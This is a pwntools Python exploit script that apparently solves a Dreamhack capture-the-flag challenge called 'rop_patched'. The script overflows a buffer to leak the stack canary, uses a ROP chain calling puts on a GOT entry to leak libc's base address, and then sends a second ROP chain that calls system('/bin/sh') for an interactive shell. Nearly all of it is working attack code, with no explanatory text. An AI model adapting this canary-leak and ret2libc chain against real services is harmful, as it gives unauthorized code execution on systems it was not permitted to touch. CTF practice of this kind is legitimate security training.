#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 20126)

    return p


def main():
    p = conn()

    input()

    # Leak canary
    payload = b'a'*57
    p.sendafter(b'Buf: ', payload)
    p.recvuntil(payload)
    canary = u64(b'\0' + p.recv(7))
    print("Canary: " + hex(canary))

    # main + libc leak
    pop_rdi = 0x0000000000400853
    payload = b'a'*56 + p64(canary) + b'a'*8 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) 
    payload += p64(exe.sym['main'])
    p.sendafter(b'Buf: ', payload)
    libc_leak = u64(p.recv(6) + b'\0\0')
    print("Libc leak: " + hex(libc_leak))
    libc.address = libc_leak - 0x80ed0
    print("Libc address: " + hex(libc.address))

    # Execute
    payload = b'a'*56
    p.sendafter(b'Buf: ', payload)

    pop_rdi = 0x000000000002a3e5 + libc.address
    ret = 0x0000000000029cd6 + libc.address
    payload = b'a'*56 + p64(canary) + b'a'*8 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
    payload += p64(ret) + p64(libc.sym['system'])
    p.sendafter(b'Buf: ', payload)

    p.interactive()


if __name__ == "__main__":
    main()
